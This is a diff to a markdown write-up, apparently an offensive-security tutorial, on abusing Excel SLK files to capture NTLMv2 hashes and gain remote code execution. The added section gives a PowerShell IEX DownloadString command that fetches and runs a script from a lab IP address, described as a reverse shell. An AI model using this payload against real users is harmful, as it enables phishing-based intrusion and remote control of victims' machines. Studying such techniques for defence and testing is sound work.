@@ -29,7 +29,7 @@ Objective is to capture NTLMv2 hashes by using the above programs. The user shou
 
 I found this exploit on [ired.team](https://ired.team/offensive-security/phishing-with-ms-office/phishing-.slk-excel) which gave a great walkthrough oh how to exactact perform RCE in an SLK file.
 
-### Excel RCE
+### Excel RCE 
 
 #### Setup
 1. Create an new text file, put the the below code and save it as .slk file:
@@ -53,8 +53,16 @@ Once the file.slk is opened the user will need to click on `Enable Content`. Onc
 
 ![](excel_NTLMv2_hash_capture.gif)
 
-### Excel RCE - Powershell Reverse shell
+### Excel RCE - Powershell Reverse shell(BONUS)
 
+1. Change the `cmd.exe /c \\IP\IPC$` to 
 
+````
+powershell IEX 
+	(New-Object Net.WebClient).DownloadString(
+	'http://192.168.56.101/test.ps1')
+````
+2. set up `test.ps1` on a server. 
+test.ps1 is a [powershell reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)
 
 More on [Symbolic Link](https://en.wikipedia.org/wiki/SYmbolic_LinK_(SYLK)) files
